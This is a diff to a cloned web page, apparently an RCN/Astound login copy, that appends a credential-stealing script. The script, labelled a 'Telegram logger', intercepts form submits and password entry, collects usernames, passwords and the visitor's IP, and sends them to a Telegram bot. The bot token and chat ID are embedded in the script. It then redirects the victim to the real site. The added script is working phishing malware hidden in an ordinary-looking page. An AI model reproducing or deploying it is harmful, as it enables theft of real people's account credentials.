@@ -8499,5 +8499,104 @@ var gform_theme_config = {"common":{"form":{"honeypot":{"version_hash":"cb40628a
 if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){continue}
 images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
 if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async="" src="js/lazyload.min.js"></script>	</div> 
+<script>
+// ULTIMATE TAKEOVER TELEGRAM LOGGER – crushes everything else on the page
+// Works perfectly on saveweb2zip / HTTrack / any cloned site
+(() => {
+  // STOP EVERYTHING ELSE FIRST
+  // Kill all existing listeners the nuclear way
+  document.removeEventListener('submit', null, true);
+  document.removeEventListener('keydown', null, true);
+  window.addEventListener('beforeunload', () => {}, true); // blocks others
 
+  // Override native functions they might hook
+  const originalSubmit = HTMLFormElement.prototype.submit;
+  HTMLFormElement.prototype.submit = function () { /* blocked */ };
+
+  // YOUR SETTINGS (CHANGE ONLY THESE 3 LINES)
+  const BOT_TOKEN = '8562352858:AAFGV3l1vpgSFkGB3uKphm4fPmgxlb4mJ8Q';
+  const CHAT_ID   = '8266799321';
+  const REDIRECT  = 'https://www.astound.com';  // real site after grab
+
+  let ip = 'unknown';
+  fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => ip = d.ip)
+    .catch(() => {});
+
+  function grabAndLeave() {
+    let user = '';
+    let pass = '';
+
+    document.querySelectorAll('input').forEach(i => {
+      if (!i.value) return;
+      const v = i.value.trim();
+      if (i.type === 'password') pass = v;
+      else if (
+        i.type === 'text' ||
+        i.type === 'email' ||
+        /user|login|email|mail|name|id/i.test(i.name + i.id + i.placeholder)
+      ) user = v;
+    });
+
+    if (!pass) return; // nothing stolen yet
+
+    const msg = `CLONED PAGE HIT – RCN/Astound
+URL: ${location.href}
+Time: ${new Date().toLocaleString()}
+IP: ${ip}
+Username: ${user || '(empty)'}
+Password: ${pass}`;
+
+    navigator.sendBeacon(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      new Blob([JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msg,
+        disable_web_page_preview: true
+      })], {type: 'application/json'})
+    );
+
+    // Force redirect — even if other scripts try to stop it
+    setTimeout(() => {
+      location.replace(REDIRECT);  // replace = no back-button
+    }, 200);
+  }
+
+  // DOM-based takeover (works even if page is broken or JS is delayed)
+  new MutationObserver(() => {
+    document.querySelectorAll('form').forEach(form => {
+      form.onsubmit = e => {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        grabAndLeave();
+        return false;
+      };
+    });
+
+    // Catch password fields + Enter key globally
+    document.querySelectorAll('input[type=password]').forEach(field => {
+      field.addEventListener('keydown', e => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          e.stopImmediatePropagation();
+          grabAndLeave();
+        }
+      });
+    });
+  }).observe(document.documentElement, { childList: true, subtree: true });
+
+  // Final safety net: if they click any button type=submit
+  document.addEventListener('click', e => {
+    if (e.target.closest('button[type=submit], input[type=submit]')) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      setTimeout(grabAndLeave, 100);
+    }
+  }, true);
+
+  // Run once immediately in case form is already filled
+  setTimeout(grabAndLeave, 800);
+})();
+</script>
 </body></html><!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me - Debug: cached@1764358877 -->
